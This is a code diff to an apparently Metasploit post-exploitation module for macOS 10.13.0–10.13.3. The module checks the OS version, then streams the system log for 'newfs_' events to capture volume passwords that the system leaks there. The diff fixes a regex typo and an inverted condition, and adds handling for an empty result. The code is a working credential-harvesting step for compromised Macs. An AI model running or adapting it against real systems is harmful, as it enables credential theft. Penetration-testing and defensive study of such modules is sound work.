@@ -38,17 +38,26 @@ class MetasploitModule < Msf::Post
   end
 
   def check
-    osx_version = cmd_exec('sw_vers -productVersion')
-    # Would using Gem::Version checking be faster?
-    return CheckCode::Vulnerable if osx_version ~= /10\.13\.[0-3]/
-    return CheckCode::Safe
+    # sw_vers looks like this:
+    # ProductName: macOS
+    # ProductVersion: 10.12
+    # BuildVersion: 7A100
+    osx_version = cmd_exec('sw_vers | grep "ProductVersion" | awk \'{ print $2 }\'')
+    # Would using Gem::Version checking be more reliable?
+    return CheckCode::Vulnerable if osx_version =~ /^10\.13\.[0-3]$/
+    CheckCode::Safe
   end
 
   def run
     return if check == CheckCode::Safe
     cmd = "log stream --info --predicate 'eventMessage contains \"newfs_\"'"
-    cmd << " | grep #{datastore['MOUNT_PATH']}" if datastore['MOUNT_PATH'].empty?
+    cmd << " | grep #{datastore['MOUNT_PATH']}" unless datastore['MOUNT_PATH'].empty?
     vprint_status "Running \"#{cmd}\" on target..."
-    print_good cmd_exec(cmd)
+    results = cmd_exec(cmd)
+    if results.empty?
+      print_error 'Got no response from target. Stopping...'
+    else
+      print_good results
+    end
   end
 end
